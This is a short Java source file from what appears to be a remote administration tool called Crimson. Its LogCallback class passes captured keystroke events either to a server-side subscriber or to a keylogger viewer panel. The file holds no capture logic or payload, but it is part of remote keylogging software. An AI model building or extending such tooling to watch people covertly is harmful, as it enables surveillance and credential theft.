package com.subterranean_security.crimson.sv.keylogger;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.core.stream.subscriber.SubscriberSlave;
import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.keylogger.Keylogger;

public class LogCallback {
	Object target;

	public LogCallback(Object target) {
		this.target = target;
	}

	public void launch(EV_KEvent k) {
		switch (Common.instance) {

		case SERVER:
			((SubscriberSlave) target).trigger(k);
			break;
		case VIEWER:
			((Keylogger) target).addKEvent(k);
			break;

		}

	}
}
